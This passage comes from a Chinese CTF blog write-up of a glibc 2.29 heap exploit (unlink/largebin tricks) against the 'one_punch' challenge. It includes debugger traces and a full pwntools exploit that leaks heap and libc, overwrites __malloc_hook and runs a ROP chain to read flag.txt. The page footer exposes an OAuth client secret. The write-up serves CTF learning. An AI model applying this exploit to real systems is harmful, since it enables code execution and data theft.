class="number">0x7f6e00f2677d</span> &lt;unlink_chunk.isra+<span class="number">29</span>&gt;     mov    rdx, qword ptr [rdi + <span class="number">0x18</span>]</span><br><span class="line"> ► <span class="number">0x7f6e00f26781</span> &lt;unlink_chunk.isra+<span class="number">33</span>&gt;     cmp    rdi, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x7f6e00f26785</span> &lt;unlink_chunk.isra+<span class="number">37</span>&gt;     jne    unlink_chunk.isra+<span class="number">176</span> &lt;<span class="number">0x7f6e00f26810</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x7f6e00f26810</span> &lt;unlink_chunk.isra+<span class="number">176</span>&gt;    lea    rdi, [rip + <span class="number">0x11d1b6</span>]</span><br><span class="line">   <span class="number">0x7f6e00f26817</span> &lt;unlink_chunk.isra+<span class="number">183</span>&gt;    call   malloc_printerr &lt;<span class="number">0x7f6e00f26580</span>&gt;</span><br></pre></td></tr></table></figure>

<p>对比的地方是rdi和rax+0x18的位置，所以是fd_nextsize的内容要等于fake chunk</p>
<p>unlink:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">unlink_chunk (mstate av, mchunkptr p)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>)) <span class="comment">// 本题中，对应next chunk的fd_nextsize和bk_nextsize的位置</span></span><br><span class="line">    malloc_printerr (<span class="string">"corrupted double-linked list"</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">	malloc_printerr (<span class="string">"corrupted double-linked list (not small)"</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">	    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">	      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.这个方法好像没用到真正的largebin attack，更像是unsortedbin attack?<br>好像这个方法用的是unlink，不是largebin</p>
<h4 id="方法二’s-exp"><a href="#方法二’s-exp" class="headerlink" title="方法二’s exp"></a>方法二’s exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># host = '52.198.120.1'</span></span><br><span class="line"><span class="comment"># port = 48763</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./one_punch'</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">"./one_punch"</span></span><br><span class="line">context.binary = binary</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">  log.success(<span class="string">"libc load success"</span>)</span><br><span class="line">  system_off = libc.symbols.system</span><br><span class="line">  log.success(<span class="string">"system_off = "</span>+hex(system_off))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  log.failure(<span class="string">"libc not found !"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(index, name)</span>:</span></span><br><span class="line">  r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">  r.sendline(<span class="string">"1"</span>)</span><br><span class="line">  r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">  r.sendline(str(index))</span><br><span class="line">  r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">  r.send(name)</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span><span class="params">(index,name)</span>:</span></span><br><span class="line">  r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">  r.sendline(<span class="string">"2"</span>)</span><br><span class="line">  r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">  r.sendline(str(index))</span><br><span class="line">  r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">  r.send(name)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">(index)</span>:</span></span><br><span class="line">  r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">  r.sendline(<span class="string">"4"</span>)</span><br><span class="line">  r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">  r.sendline(str(index))</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">  r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">  r.sendline(<span class="string">"3"</span>)</span><br><span class="line">  r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">  r.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span><span class="params">(data)</span>:</span></span><br><span class="line">  r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">  r.sendline(str(<span class="number">0xc388</span>))</span><br><span class="line">  time.sleep(<span class="number">0.1</span>)</span><br><span class="line">  r.send(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if len(sys.argv) == 1:</span></span><br><span class="line"><span class="comment">#   r = process([binary, "0"], env=&#123;"LD_LIBRARY_PATH":"."&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#   r = remote(host ,port)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  <span class="comment"># gdb.attach(r)</span></span><br><span class="line">  </span><br><span class="line">  name(<span class="number">0</span>,<span class="string">"A"</span>*<span class="number">0x210</span>)</span><br><span class="line">  d(<span class="number">0</span>)</span><br><span class="line">  name(<span class="number">1</span>,<span class="string">"A"</span>*<span class="number">0x210</span>)</span><br><span class="line">  d(<span class="number">1</span>)</span><br><span class="line">  show(<span class="number">1</span>)</span><br><span class="line">  r.recvuntil(<span class="string">" name: "</span>)</span><br><span class="line">  heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x260</span></span><br><span class="line">  <span class="comment"># print("heap = &#123;&#125;".format(hex(heap)))</span></span><br><span class="line">  <span class="keyword">print</span> hex(heap)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">    name(<span class="number">2</span>,<span class="string">"A"</span>*<span class="number">0x210</span>)</span><br><span class="line">    d(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  name(<span class="number">0</span>,<span class="string">"A"</span>*<span class="number">0x210</span>)</span><br><span class="line">  name(<span class="number">1</span>,<span class="string">"A"</span>*<span class="number">0x210</span>)</span><br><span class="line">  d(<span class="number">0</span>)</span><br><span class="line">  show(<span class="number">0</span>)</span><br><span class="line">  r.recvuntil(<span class="string">" name: "</span>)</span><br><span class="line">  libc = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line">  print(<span class="string">"libc = &#123;&#125;"</span>.format(hex(libc)))</span><br><span class="line">  d(<span class="number">1</span>)</span><br><span class="line">  </span><br><span class="line">  rename(<span class="number">2</span>,p64(libc + <span class="number">0x1e4c30</span>))</span><br><span class="line"></span><br><span class="line">  name(<span class="number">0</span>,<span class="string">"D"</span>*<span class="number">0x90</span>)</span><br><span class="line">  d(<span class="number">0</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 构造largebin attack的堆块</span></span><br><span class="line"><span class="comment"># full count</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">7</span>): </span><br><span class="line">    name(<span class="number">0</span>,<span class="string">"D"</span>*<span class="number">0x80</span>)</span><br><span class="line">    d(<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">7</span>):</span><br><span class="line">    name(<span class="number">0</span>,<span class="string">"D"</span>*<span class="number">0x200</span>)</span><br><span class="line">    d(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin 0x431</span></span><br><span class="line">  name(<span class="number">0</span>,<span class="string">"D"</span>*<span class="number">0x200</span>)</span><br><span class="line">  name(<span class="number">1</span>,<span class="string">"A"</span>*<span class="number">0x210</span>)</span><br><span class="line">  name(<span class="number">2</span>,p64(<span class="number">0x21</span>)*(<span class="number">0x90</span>/<span class="number">8</span>))</span><br><span class="line">  rename(<span class="number">2</span>,p64(<span class="number">0x21</span>)*(<span class="number">0x90</span>/<span class="number">8</span>)) <span class="comment">#填充size</span></span><br><span class="line">  d(<span class="number">2</span>)</span><br><span class="line">  <span class="comment"># calloc从unsortedbin中取，不取tcache</span></span><br><span class="line">  name(<span class="number">2</span>,p64(<span class="number">0x21</span>)*(<span class="number">0x90</span>/<span class="number">8</span>))</span><br><span class="line">  rename(<span class="number">2</span>,p64(<span class="number">0x21</span>)*(<span class="number">0x90</span>/<span class="number">8</span>))</span><br><span class="line">  d(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">  d(<span class="number">0</span>)  <span class="comment">#unsorted bin</span></span><br><span class="line">  d(<span class="number">1</span>)  <span class="comment">#unlink </span></span><br><span class="line">  name(<span class="number">0</span>,<span class="string">"A"</span>*<span class="number">0x80</span>) </span><br><span class="line">  name(<span class="number">1</span>,<span class="string">"A"</span>*<span class="number">0x80</span>) <span class="comment">#free 0x311 形成两个不一样的chunk</span></span><br><span class="line">  </span><br><span class="line">  d(<span class="number">0</span>)  <span class="comment">#chunk0  fd- &gt; 0x550</span></span><br><span class="line">  d(<span class="number">1</span>)  <span class="comment"># sum 0x431 </span></span><br><span class="line">   </span><br><span class="line">  name(<span class="number">0</span>,<span class="string">"A"</span>*<span class="number">0x88</span> + p64(<span class="number">0x421</span>) + <span class="string">"D"</span>*<span class="number">0x180</span> )</span><br><span class="line">  name(<span class="number">2</span>,<span class="string">"A"</span>*<span class="number">0x200</span>) <span class="comment">#将1和0合并，calloc改成2</span></span><br><span class="line">  </span><br><span class="line">  d(<span class="number">1</span>)  <span class="comment">#0x421</span></span><br><span class="line">  d(<span class="number">2</span>)  <span class="comment">#0x211 </span></span><br><span class="line">  name(<span class="number">2</span>,<span class="string">"A"</span>*<span class="number">0x200</span>) <span class="comment">#into largebin</span></span><br><span class="line">  rename(<span class="number">0</span>,<span class="string">"A"</span>*<span class="number">0x88</span> + p64(<span class="number">0x421</span>) + p64(libc + <span class="number">0x1e5090</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(heap+<span class="number">0x10</span>) )  <span class="comment">#--&gt; chunk1   构造largebin attack 的堆块</span></span><br><span class="line">  d(<span class="number">0</span>)</span><br><span class="line">  d(<span class="number">2</span>) <span class="comment">#unlink 0x431</span></span><br><span class="line">  <span class="comment"># gdb.attach(r)</span></span><br><span class="line">  <span class="comment"># pause() </span></span><br><span class="line">  name(<span class="number">0</span>,<span class="string">"./flag.txt\x00\x00"</span> + <span class="string">"A"</span>*<span class="number">0x1f0</span>)  <span class="comment">#full the tcache size  ,0x430 write './flag.txt'  calloc之后将tcache的count填满</span></span><br><span class="line">  magic(<span class="string">"ABCDE"</span>) <span class="comment">#malloc -&gt; tcache read chunk_addr(list has 2 chunk,this is the first)</span></span><br><span class="line">   </span><br><span class="line">  add_rsp48 = libc + <span class="number">0x000000000008cfd6</span></span><br><span class="line">  pop_rdi = libc + <span class="number">0x0000000000026542</span></span><br><span class="line">  pop_rsi = libc + <span class="number">0x0000000000026f9e</span></span><br><span class="line">  pop_rdx = libc + <span class="number">0x000000000012bda6</span></span><br><span class="line">  pop_rax = libc + <span class="number">0x0000000000047cf8</span></span><br><span class="line">  syscall = libc + <span class="number">0xcf6c5</span></span><br><span class="line"></span><br><span class="line">  magic( p64(add_rsp48)) <span class="comment">#malloc -&gt; mnalloc_hook</span></span><br><span class="line">  gdb.attach(r) </span><br><span class="line"></span><br><span class="line">  name(<span class="number">0</span>,p64(pop_rdi) + p64(heap + <span class="number">0x24d0</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">2</span>) + p64(syscall) +</span><br><span class="line">      p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(pop_rax) + p64(<span class="number">0</span>) + p64(syscall) +</span><br><span class="line">      p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(pop_rax) + p64(<span class="number">1</span>) + p64(syscall)</span><br><span class="line">      ) </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>calloc之后有一个地方会跳转到malloc_hook的地方</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f05b5182a28</span> &lt;calloc+<span class="number">40</span>&gt;     mov    rax, qword ptr [rip + <span class="number">0x14a4c1</span>]</span><br><span class="line">  <span class="number">0x7f05b5182a2f</span> &lt;calloc+<span class="number">47</span>&gt;     mov    rax, qword ptr [rax]</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RAX  <span class="number">0x7f05b52cdc30</span> (__malloc_hook) —▸ <span class="number">0x7f05b5175fd6</span> (_IO_vtable_check+<span class="number">118</span>) ◂— add    rsp, <span class="number">0x48</span></span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7f05b5182a32</span> &lt;calloc+<span class="number">50</span>&gt;     test   rax, rax</span><br><span class="line"><span class="number">0x7f05b5182a35</span> &lt;calloc+<span class="number">53</span>&gt;     jne    calloc+<span class="number">720</span> &lt;<span class="number">0x7f05b5182cd0</span>&gt;</span><br></pre></td></tr></table></figure>

<p>此时stack的内容是</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp   <span class="number">0x7ffc152a6c48</span> —▸ <span class="number">0x7f1389569cda</span> (calloc+<span class="number">730</span>) ◂— test   rax, rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ r8<span class="number">-1</span>  <span class="number">0x7ffc152a6c50</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│       <span class="number">0x7ffc152a6c58</span> —▸ <span class="number">0x7ffc152a70a0</span> —▸ <span class="number">0x7ffc152a70c0</span> —▸ <span class="number">0x560a78448f60</span> ◂— push   r15</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│       <span class="number">0x7ffc152a6c60</span> —▸ <span class="number">0x560a78448150</span> ◂— xor    ebp, ebp</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│       <span class="number">0x7ffc152a6c68</span> —▸ <span class="number">0x7ffc152a71a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│       <span class="number">0x7ffc152a6c70</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│       <span class="number">0x7ffc152a6c78</span> —▸ <span class="number">0x560a784483a1</span> ◂— mov    rcx, rax</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│       <span class="number">0x7ffc152a6c80</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│       <span class="number">0x7ffc152a6c88</span> ◂— <span class="number">0xc800000000</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│       <span class="number">0x7ffc152a6c90</span> —▸ <span class="number">0x7f13894f6542</span> (init_cacheinfo+<span class="number">242</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│       <span class="number">0x7ffc152a6c98</span> —▸ <span class="number">0x560a7a2674d0</span> ◂— <span class="string">'./flag.txt'</span>   <span class="comment">#这里开始就是rop</span></span><br><span class="line"><span class="number">0</span>b:<span class="number">0058</span>│       <span class="number">0x7ffc152a6ca0</span> —▸ <span class="number">0x7f13894f6f9e</span> (strip+<span class="number">190</span>) ◂— pop    rsi</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│       <span class="number">0x7ffc152a6ca8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│       <span class="number">0x7ffc152a6cb0</span> —▸ <span class="number">0x7f1389517cf8</span> (mblen+<span class="number">104</span>) ◂— pop    rax</span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│       <span class="number">0x7ffc152a6cb8</span> ◂— <span class="number">0x2</span></span><br><span class="line"><span class="number">0</span>f:<span class="number">0078</span>│       <span class="number">0x7ffc152a6cc0</span> —▸ <span class="number">0x7f138959f6c5</span> (__time_syscall+<span class="number">5</span>) ◂— syscall </span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│       <span class="number">0x7ffc152a6cc8</span> —▸ <span class="number">0x7f13894f6542</span> (init_cacheinfo+<span class="number">242</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│       <span class="number">0x7ffc152a6cd0</span> ◂— <span class="number">0x3</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│       <span class="number">0x7ffc152a6cd8</span> —▸ <span class="number">0x7f13894f6f9e</span> (strip+<span class="number">190</span>) ◂— pop    rsi</span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│       <span class="number">0x7ffc152a6ce0</span> —▸ <span class="number">0x560a7a265000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│       <span class="number">0x7ffc152a6ce8</span> —▸ <span class="number">0x7f13895fbda6</span> (__lll_lock_wait_private+<span class="number">38</span>) ◂— pop    rdx</span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│       <span class="number">0x7ffc152a6cf0</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00</span>b0│       <span class="number">0x7ffc152a6cf8</span> —▸ <span class="number">0x7f1389517cf8</span> (mblen+<span class="number">104</span>) ◂— pop    rax</span><br><span class="line"><span class="number">17</span>:<span class="number">00</span>b8│       <span class="number">0x7ffc152a6d00</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│       <span class="number">0x7ffc152a6d08</span> —▸ <span class="number">0x7f138959f6c5</span> (__time_syscall+<span class="number">5</span>) ◂— syscall </span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│       <span class="number">0x7ffc152a6d10</span> —▸ <span class="number">0x7f13894f6542</span> (init_cacheinfo+<span class="number">242</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│       <span class="number">0x7ffc152a6d18</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">1</span>b:<span class="number">00</span>d8│       <span class="number">0x7ffc152a6d20</span> —▸ <span class="number">0x7f13894f6f9e</span> (strip+<span class="number">190</span>) ◂— pop    rsi</span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│       <span class="number">0x7ffc152a6d28</span> —▸ <span class="number">0x560a7a265000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│       <span class="number">0x7ffc152a6d30</span> —▸ <span class="number">0x7f13895fbda6</span> (__lll_lock_wait_private+<span class="number">38</span>) ◂— pop    rdx</span><br><span class="line"><span class="number">1</span>e:<span class="number">00</span>f0│       <span class="number">0x7ffc152a6d38</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">1</span>f:<span class="number">00</span>f8│       <span class="number">0x7ffc152a6d40</span> —▸ <span class="number">0x7f1389517cf8</span> (mblen+<span class="number">104</span>) ◂— pop    rax</span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│       <span class="number">0x7ffc152a6d48</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">21</span>:<span class="number">0108</span>│       <span class="number">0x7ffc152a6d50</span> —▸ <span class="number">0x7f138959f6c5</span> (__time_syscall+<span class="number">5</span>) ◂— syscall </span><br><span class="line"><span class="number">22</span>:<span class="number">0110</span>│       <span class="number">0x7ffc152a6d58</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="meta">... </span>↓</span><br></pre></td></tr></table></figure>

<p>所以malloc就要用到rsp+0x48的位置<br>然后就会执行rop链getshell</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://c0yo7e.github.io/2020/08/06/largebin-attack-glibc2-29/" data-id="ckdjwzrmm000em4sw7t2dj43i"
         class="article-share-link">Share</a>
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwm知识点/">pwm知识点</a></li></ul>

    </footer>

  </div>

  
    
  <nav class="article-nav">
    
    
      <a href="/2020/08/02/BUU刷题集/" class="article-nav-link">
        <strong class="article-nav-caption">Olde posts</strong>
        <div class="article-nav-title">BUU刷题集</div>
      </a>
    
  </nav>


  

  
    
  <div class="gitalk" id="gitalk-container"></div>
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
  <script type="text/javascript">
    var gitalk = new Gitalk({
      clientID: '57453e2505e1523b1d78',
      clientSecret: 'c9d2109f4649be7dca5ef5622d85e38608a7cd1e',
      repo: 'content',
      owner: 'C0yo7e',
      admin: ['C0yo7e'],
      // id: location.pathname,      // Ensure uniqueness and length less than 50
      id: md5(location.pathname),
      distractionFreeMode: false,  // Facebook-like distraction free mode
      pagerDirection: 'last'
    })

  gitalk.render('gitalk-container')
  </script>

  

</article>



</section>
  <footer class="footer">
  <div class="outer">
    <div class="float-right">
      <ul class="list-inline">
  
    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
  
</ul>
    </div>
    <ul class="list-inline">
      <li>&copy; 2020 The lair of C0yo7e</li>
